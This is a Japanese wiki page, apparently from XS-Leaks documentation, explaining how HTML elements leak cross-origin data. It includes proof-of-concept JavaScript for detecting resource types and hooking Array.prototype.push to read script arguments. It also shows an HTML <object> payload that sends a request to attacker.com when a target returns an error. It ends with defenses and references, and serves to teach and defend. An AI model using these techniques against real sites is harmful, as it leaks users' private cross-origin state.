+++
title = "Element leaks"
description = ""
category = "Attack"
abuse = [
    "HTMLElement",
]
defenses = [
    "SameSite Cookies"
]
menu = "main"
weight = 2
+++

一部のHTML要素は、クロスオリジンのページにデータの一部をリークさせるために使用される可能性があります。 
たとえば、以下のようなメディアリソースは、サイズ、期間、種類に関する情報をリークさせる可能性があります。

- [HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)は、メディアの`duration`と`buffered`の時間をリークします。
- [HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement) は`videoHeight`と`videoWidth`をリークします。一部のブラウザでは、`webkitVideoDecodedByteCount`、 `webkitAudioDecodedByteCount`、`webkitDecodedFrameCount`も含む可能性があります
- [getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)は`totalVideoFrames`をリークします。
- [HTMLImageElement]（https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement）は`height`と`width`をリークしますが、画像が無効な場合には、それらは0となり、[`image.decode()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/decode)は拒否されます。

メディアタイプの固有のプロパティによって、メディアタイプを区別することができます。
たとえば、`<video>`の場合は`videoWidth`、`<audio>`の場合は`duration`といった具合です。 
以下のコードは、リソースの種類を返すサンプルコードを示しています。

```javascript
async function getType(url) {
    // リソースがaudioもしくはvideoかどうかを検知
    let media = document.createElement("video");
    media.src = url;
    await new Promise(r=>setTimeout(r,50));
    if (media.videoWidth) {
    return "video";
    } else if (media.duration) {
    return "audio"
    }
    // リソースがimageかどうかを検知
    let image = new Image();
    image.src = url;
    await new Promise(r=>setTimeout(r,50));
    if (image.width) return "image";
}
```

## CORBの悪用

[CORB]({{< ref "/docs/attacks/browser-features/corb.md" >}}) は、間違ったコンテンツタイプが使用された場合にレスポンスを空にするChromeの機能です。
これは、コンテンツタイプが間違っている場合、キャッシュされないことを意味します。
 `ifCached` 関数については[Cache Probing]({{< ref "/docs/attacks/cache-probing.md" >}})の記事にて確認できます。

```javascript
async function isType(url, type = "script") {
  let error = false;
  // urlをパージする
  await ifCached(url, true);
  // リソースの読み込みを試行
  let e = document.createElement(type);
  e.onerror = () => error = true;
  e.src = url;
  document.head.appendChild(e);
  // CORBで許可されていれば、キャッシュされるのを待つ
  await new Promise(resolve => setTimeout(resolve, 500));
  // クリーンアップ
  document.head.removeChild(e);
  // ブロックされた"images"の修正
  if (error) return false
  return ifCached(url);
}
```

[getComputedStyle](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)は、現在のページに埋め込まれたCSSスタイルシートを読み取るために使用することができます。
これは異なるオリジンから読み込まれたものも含みます。
この関数は、ボディに適用されたスタイルがあるかどうかをチェックするだけのものです。

```javascript
async function isCSS(url) {
    let link = document.createElement('link');
    link.rel = 'stylesheet';
    link.type = 'text/css';
    link.href = url;
    let style1 = JSON.stringify(getComputedStyle(document.body));
    document.head.appendChild(link);
    await new Promise(resolve => setTimeout(resolve, 500));
    let style2 = JSON.stringify(getComputedStyle(document.body));
    document.head.removeChild(link);
    return (style1 !== style2);
}
```

## PDF
 [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113)には、`zoom`, `view`, `page`, `toolbar` などのコンテンツを制御することができるものが用意されています。 
chromeの場合、内部で`embed`を使用しているため、[frame counting]({{< ref "/docs/attacks/frame-counting.md" >}})でPDFを検出することが可能です。

```javascript
async function isPDF(url) {
    let w = open(url);
    await new Promise(resolve => setTimeout(resolve, 500));
    let result = (w.length === 1);
    w.close();
    return result;
}
```

{{< hint warning  >}} } ページに他の埋め込みがある場合、誤検知が発生します。 {{< /hint >}}

## スクリプトタグ
クロスオリジンのスクリプトがページに含まれる場合、その内容を直接読み取ることはできません。
しかし、スクリプトが組み込み関数を使用している場合には、関数を上書きすることでその引数を読むことができるため、機密情報をリークする可能性があります[^script-leaks]。

```javascript
let hook = window.Array.prototype.push;
window.Array.prototype.push = function() {
    console.log(this);
    return hook.apply(this, arguments);
}
```

## Javascriptが使用できない場合

JavaScriptが無効な場合でも、クロスオリジンのリソースに関するいくつかの情報が漏えいする可能性があります。
例えば、`<object>` を利用して、リソースがエラーコードで応答するかどうかを検出することができます。
リソース`//example.org/resource`が`<object data=//example.org/resource>fallback</object>`でエラーを返した場合、`fallback`がレンダリングされます[^fallback] [^leaky-images]。
内部に別の`<object>`を挿入して情報を外部サーバにリークしたり、CSS[^xsleaks-nojs]で検出したりすることができます。
以下のコードは `//example.org/404` を埋め込み、それが *Error* で応答した場合、 フォールバックとして`//attacker.com/?error` へのリクエストも行われます。

```html
<object data="//example.com/404">
  <object data="//attacker.com/?error"></object>
</object>
```

## 対策

| Attack Alternative | [SameSite Cookies (Lax)]({{< ref "/docs/defenses/opt-in/same-site-cookies.md" >}}) | [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) | [Framing Protections]({{< ref "/docs/defenses/opt-in/xfo.md" >}}) |                                          [Isolation Policies]({{< ref "/docs/defenses/isolation-policies" >}})                                           |
| :----------------: | :--------------------------------------------------------------------------------: | :-------------------------------------------------: | :---------------------------------------------------------------: | :------------------------------------------------------------------------------------------------------------------------------------------------------: |
| Type leaks |                                         ✔️                                         |                         ❌                          |                                ❌                                 | [RIP]({{< ref "/docs/defenses/isolation-policies/resource-isolation" >}}) 🔗 [NIP]({{< ref "/docs/defenses/isolation-policies/navigation-isolation" >}}) |

## 参考文献
[^script-leaks]: The Unexpected Dangers of Dynamic JavaScript. [link](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf)   
[^fallback]: HTML Standard, [3.2.5.2.6 Embedded content], [link](https://html.spec.whatwg.org/multipage/dom.html#fallback-content)  
[^leaky-images]: Leaky Images: Targeted Privacy Attacks in the Web, [3.4 Linking User Identities], [link](https://www.usenix.org/system/files/sec19fall_staicu_prepub.pdf)  
[^xsleaks-nojs]: [https://twitter.com/terjanq/status/1180477124861407234](https://twitter.com/terjanq/status/1180477124861407234)  